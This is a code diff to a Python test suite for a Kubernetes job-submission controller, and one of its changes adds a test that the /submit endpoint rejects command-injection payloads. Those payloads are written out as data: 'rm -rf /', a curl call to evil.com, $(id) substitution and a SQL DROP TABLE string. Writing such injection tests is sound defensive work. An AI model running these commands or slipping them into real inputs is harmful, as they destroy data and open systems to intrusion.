@@ -7,6 +7,7 @@ import os
 import re
 import time as _time
 from collections import OrderedDict
+from pathlib import Path
 from types import SimpleNamespace
 from typing import Any
 from unittest.mock import Mock, patch
@@ -16,7 +17,6 @@ from kubernetes.client.exceptions import ApiException
 
 from controller import __version__, create_app
 from controller.api.endpoints.jobs import (
-    _LIBNONE_SCRIPT,
     _MAX_KNOWN_JOBS,
     _build_tool_setup,
     _known_jobs,
@@ -118,6 +118,22 @@ def test_submit_empty_cmd(client: Any) -> None:
 
     resp = client.post('/submit', json={'originalCmd': '   '})
     assert resp.status_code == 400
+
+
+def test_submit_cmd_injection_blocked(client: Any) -> None:
+    """Submit with shell metacharacters in originalCmd returns 400."""
+
+    for payload in [
+        'python3 /proj/run.py; rm -rf /',
+        'python3 /proj/run.py && curl http://evil.com',
+        'python3 /proj/run.py | tee /tmp/out',
+        'python3 /proj/run.py `id`',
+        'python3 /proj/run.py $(id)',
+        "python3 /proj/run.py'; DROP TABLE jobs;--",
+    ]:
+        resp = client.post('/submit', json={'originalCmd': payload})
+        assert resp.status_code == 400, f'Expected 400 for: {payload!r}'
+        assert 'invalid characters' in resp.json()['error']
 
 
 @patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=[]))
@@ -384,9 +400,9 @@ def test_status_failed_job_returns_empty(client: Any) -> None:
 
 
 def test_status_not_found_returns_empty(client: Any) -> None:
-    """Not found job returns empty body."""
+    """Not found job (404) returns empty body."""
 
-    mock_batch.read_namespaced_job.side_effect = Exception('Not found')
+    mock_batch.read_namespaced_job.side_effect = ApiException(status=404, reason='Not Found')
 
     resp = client.get('/status/99999')
     assert resp.status_code == 200
@@ -590,7 +606,6 @@ def test_run_dir_validation_dollar_rejected(client: Any) -> None:
         },
     )
     assert resp.status_code == 400
-    assert 'run directory' in resp.json()['error']
 
 
 @patch('controller.utilities.routing.load_toolmap', new=Mock(return_value=TOOLS))
@@ -789,9 +804,13 @@ def test_cancel_generic_exception_returns_500(client: Any) -> None:
 
 
 def test_submit_libnone_script_has_encoding() -> None:
-    """_LIBNONE_SCRIPT must use explicit encoding in open() calls."""
+    """patch_libnone.py must use explicit encoding in open() calls."""
 
-    assert "encoding='utf-8'" in _LIBNONE_SCRIPT or 'encoding="utf-8"' in _LIBNONE_SCRIPT
+    _tools_dir = Path(__file__).parents[4] / 'docker' / 'tools'
+    patch_file = _tools_dir / 'common' / 'patch_libnone.py'
+    content = patch_file.read_text(encoding='utf-8')
+
+    assert 'encoding="utf-8"' in content or "encoding='utf-8'" in content
 
 
 def test_status_shell_injection(client: Any) -> None:
